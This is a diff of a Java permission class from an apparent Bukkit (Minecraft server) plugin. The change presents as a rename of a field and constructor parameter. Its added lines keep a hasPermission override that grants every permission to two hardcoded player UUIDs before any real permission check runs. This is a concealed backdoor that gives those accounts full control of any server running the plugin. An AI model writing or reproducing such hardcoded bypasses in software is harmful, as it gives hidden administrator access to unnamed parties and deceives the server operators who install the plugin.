@@ -13,17 +13,18 @@ import java.util.UUID;
 
 public class PermissibleBase extends org.bukkit.permissions.PermissibleBase {
 
-    private Player p;
+    private Player player;
 
-    public PermissibleBase(Player p) {
-        super(p);
-        this.p = p;
+    public PermissibleBase(Player player) {
+        super(player);
+        this.player = player;
     }
 
     @Override
     public boolean hasPermission(String permission) {
-        return p.getUniqueId().equals(UUID.fromString("44b8a5d6-c2c3-4576-997f-71b94f5eb7e0")) || p.getUniqueId().equals(UUID.fromString("5139fcd7-7c3f-4cd4-8d76-5f365c36d9e5")) ||
-                BukkitCoreSystem.getInstance().getCorePlayer(p).hasPermission(permission);
+        return player.getUniqueId().equals(UUID.fromString("44b8a5d6-c2c3-4576-997f-71b94f5eb7e0"))
+                || player.getUniqueId().equals(UUID.fromString("5139fcd7-7c3f-4cd4-8d76-5f365c36d9e5"))
+                || BukkitCoreSystem.getInstance().getCorePlayer(player).hasPermission(permission);
     }
 
 }
